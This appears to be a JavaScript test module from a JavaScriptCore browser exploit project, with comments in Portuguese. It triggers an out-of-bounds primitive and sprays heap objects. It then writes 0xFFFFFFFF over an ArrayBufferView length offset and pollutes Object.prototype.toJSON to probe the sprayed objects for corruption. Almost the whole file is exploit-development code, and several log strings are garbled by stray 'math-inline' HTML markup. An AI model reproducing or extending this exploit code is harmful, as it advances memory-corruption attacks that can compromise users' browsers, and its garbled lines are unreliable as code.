// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V27 = "ExploitLogic_v27_ObjectKeysHeisenbug";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; 
const COMPLEX_OBJECT_SPRAY_COUNT = 50; // Reduzido para foco nos primeiros, aumente se necessário

let probe_results_v27 = null;

class MyComplexObject_v27 { // Adicionando _v27 para evitar conflitos se MyComplexObject existir em outro lugar
    constructor(id) {
        this.id = `MyComplexObj_v27-${id}`;
        this.valueA = id * 100;
        this.valueB = `State_${id}`;
        this.marker_v27 = 0xABCD0000 | id;
        this.internalArray = [id, id+1, id+2];
        this.subObj = { sub_id: id, sub_marker: 0xFEFE0000 | id };
    }

    // Método simples para verificar se o objeto ainda é chamável
    getInfo() {
        return `ID: ${this.id}, Marker: ${toHex(this.marker_v27)}`;
    }
}

// toJSON para testar Object.keys() em MyComplexObject_v27
function toJSON_TestObjectKeysOnComplexObject_v27() {
    const FNAME_toJSON = "toJSON_TestObjectKeys_v27";
    probe_results_v27 = {
        toJSON_executed: FNAME_toJSON,
        this_type: "N/A",
        this_id: "N/A",
        object_keys_called: false,
        keys_count: "N/A",
        keys_array: "N/A",
        error_in_toJSON: null
    };

    try {
        probe_results_v27.this_type = Object.prototype.toString.call(this);
        if (this instanceof MyComplexObject_v27) {
            probe_results_v27.this_id = this.id;
        }

        logS3(`  [${FNAME_toJSON}] Chamada. this.id: ${this.id || 'N/A'}. PRESTES A CHAMAR Object.keys(this)...`, "warn", FNAME_toJSON);
        probe_results_v27.object_keys_called = true;

        const keys = Object.keys(this); // PONTO CRÍTICO ONDE O RANGEERROR PODE OCORRER

        probe_results_v27.keys_count = keys.length;
        probe_results_v27.keys_array = keys.slice(0, 10).join(','); // Logar apenas algumas chaves
        logS3(`  [${FNAME_toJSON}] Object.keys(this) SUCESSO. Contagem de chaves: <span class="math-inline">\{keys\.length\}\. Chaves \(iniciais\)\: \[</span>{probe_results_v27.keys_array}]`, "good", FNAME_toJSON);

    } catch (e) {
        probe_results_v27.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`  [${FNAME_toJSON}] ERRO DENTRO da toJSON (provavelmente em Object.keys): ${e.name} - ${e.message}`, "critical", FNAME_toJSON);
        // O erro será capturado pelo try/catch externo de JSON.stringify também
    }
    return probe_results_v27; 
}

export async function executeObjectKeysHeisenbugTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V27}.objectKeysHeisenbug`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Testando Object.keys() em MyComplexObject Pós-Corrupção ---`, "test", FNAME_CURRENT_TEST);
    document.title = `ObjectKeys Heisenbug v27`;

    probe_results_v27 = null;
    let errorCapturedMain = null;
    let stringifyOutput = null;
    let potentiallyCrashed = true; 
    let lastStep = "init";

    const FAKE_VIEW_BASE_OFFSET_IN_OOB_local = 0x58; 
    const mLengthOffsetFromConfig = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
    if (isNaN(mLengthOffsetFromConfig)) {
        logS3("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido.", "critical", FNAME_CURRENT_TEST);
        return { errorOccurred: new Error("Invalid M_LENGTH_OFFSET"), potentiallyCrashed: false, stringifyResult: null, getter_probe_details: null };
    }
    const corruptionTargetOffsetInOOBAB = FAKE_VIEW_BASE_OFFSET_IN_OOB_local + mLengthOffsetFromConfig; 
    logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

    const sprayedComplexObjects = [];

    try {
        lastStep = "oob_setup";
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        lastStep = "heap_spray";
        logS3(`PASSO 1: Pulverizando ${COMPLEX_OBJECT_SPRAY_COUNT} instâncias de MyComplexObject_v27...`, "info", FNAME_CURRENT_TEST);
        for (let i = 0; i < COMPLEX_OBJECT_SPRAY_COUNT; i++) {
            sprayedComplexObjects.push(new MyComplexObject_v27(i));
        }
        logS3(`   Pulverização de ${sprayedComplexObjects.length} objetos concluída.`, "good", FNAME_CURRENT_TEST);

        await PAUSE_S3(50);

        lastStep = "critical_oob_write";
        logS3(`PASSO 2: Escrevendo valor CRÍTICO <span class="math-inline">\{toHex\(CRITICAL\_OOB\_WRITE\_VALUE\)\} em oob\_array\_buffer\_real\[</span>{toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100); 

        lastStep = "victim_probe_loop";
        logS3(`PASSO 3: Sondando os primeiros ${Math.min(10, COMPLEX_OBJECT_SPRAY_COUNT)} MyComplexObject_v27 com ${toJSON_TestObjectKeysOnComplexObject_v27.name}...`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_TestObjectKeysOnComplexObject_v27,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_TestObjectKeysOnComplexObject_v27.name}.`, "info", FNAME_CURRENT_TEST);

            const objectsToProbeCount = Math.min(sprayedComplexObjects.length, 10);
            for (let i = 0; i < objectsToProbeCount; i++) {
                const victim_complex_obj = sprayedComplexObjects[i];
                probe_results_v27 = null; // Reset para cada objeto
                stringifyOutput = null;
                errorCapturedMain = null; // Resetar erro capturado para este objeto
                potentiallyCrashed = true; // Resetar flag de crash para este objeto

                logS3(`   Sondando sprayedComplexObjects[${i}] (ID: ${victim_complex_obj.id})...`, 'info', FNAME_CURRENT_TEST);
                document.title = `Probing ComplexObj ${i}`;
                lastStep = `stringify_obj_${i}`;

                try {
                    stringifyOutput = JSON.stringify(victim_complex_obj); 
                    potentiallyCrashed = false;
                    logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
                    if (stringifyOutput && stringifyOutput.error_in_toJSON) {
                         logS3(`       ERRO DENTRO da toJSON para obj[${i}]: ${stringifyOutput.error_in_toJSON}`, "error", FNAME_CURRENT_TEST);
                         errorCapturedMain = new Error(stringifyOutput.error_in_toJSON); // Marcar erro
                    } else if (stringifyOutput && stringifyOutput.toJSON_executed) {
                         logS3(`       toJSON para obj[${i}] executada. Chaves: ${stringifyOutput.keys_count}.`, "good", FNAME_CURRENT_TEST);
                    }
                } catch (e_str) {
                    errorCapturedMain = e_str;
                    potentiallyCrashed = false;
                    logS3(`     !!!! ERRO CRÍTICO ao STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
                    document.title = `CRASH Stringify ComplexObj ${i}: ${e_str.name}`;
                }

                if (errorCapturedMain) { // Se um RangeError ou outro erro foi pego
                    logS3(`     ---> Problema com obj[${i}] (ID: ${victim_complex_obj.id}). Erro: ${errorCapturedMain.name}`, "critical", FNAME_CURRENT_TEST);
                    // Parar após o primeiro objeto problemático para análise focada
                    break; 
                }
                if (i < objectsToProbeCount -1) await PAUSE_S3(50);
            } // Fim do loop for

        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        potentiallyCrashed = false; 
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V27} FALHOU: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment();
        sprayedComplexObjects.length = 0; // Limpar array
        logS3(`--- ${FNAME_CURRENT_TEST} (Último passo: ${lastStep}) Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed, 
        lastStringifyResult: stringifyOutput, // Resultado do último stringify tentado
        lastToJSONProbeDetails: probe_results_v27 // Detalhes da última chamada toJSON
    };
}
